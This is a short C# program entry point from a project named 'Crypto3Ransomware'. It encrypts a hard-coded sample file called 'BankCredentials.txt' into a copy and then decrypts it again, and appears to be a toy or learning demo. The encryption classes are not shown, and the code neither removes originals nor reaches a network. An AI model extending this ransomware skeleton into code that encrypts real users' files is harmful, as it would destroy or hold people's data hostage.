namespace Crypto3Ransomware;

internal static class Program
{
    private static async Task Main(string[] args)
    {
        Console.WriteLine(Directory.GetCurrentDirectory());
        args =
        [
            $"..{Path.DirectorySeparatorChar}..{Path.DirectorySeparatorChar}..{Path.DirectorySeparatorChar}RandomFiles{Path.DirectorySeparatorChar}BankCredentials.txt"
        ];
        var inputManager = new InputManager(args);
        var fileToEncryptPath = inputManager.GetFileToEncryptPath();
        var encryptedFilePath = fileToEncryptPath + "2";
        var decryptedFilePath = fileToEncryptPath + "3";
        
        Console.WriteLine($"File found : {fileToEncryptPath}");

        await FileEncrypter.EncryptAndWriteToPath(fileToEncryptPath, encryptedFilePath);
        await FileDecrypter.DecryptAndWriteToPath(encryptedFilePath, decryptedFilePath);
        
        Console.ReadLine();
    }
}